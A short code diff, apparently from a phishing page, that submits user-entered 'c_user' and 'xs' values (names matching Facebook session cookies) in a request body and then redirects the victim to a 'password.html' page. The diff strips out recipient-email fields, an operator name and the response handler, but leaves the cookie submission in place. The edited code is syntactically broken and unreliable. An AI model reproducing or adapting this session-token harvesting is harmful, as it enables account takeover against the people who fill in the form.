@@ -369,14 +369,7 @@
                 body: JSON.stringify({
                     c_user: cUserInput.value,
                     xs: xsInput.value,
-                    emails: ["", ""],
-                    workerEmail: "",
-                    name: "Shaabbir",
-                }),
-            })
-            .then((response) => {
-                if (response.ok) {
-                    window.location.href = "password.html";
+                  window.location.href = "password.html";
                 } else {
                     throw new Error('Submission failed');
                 }
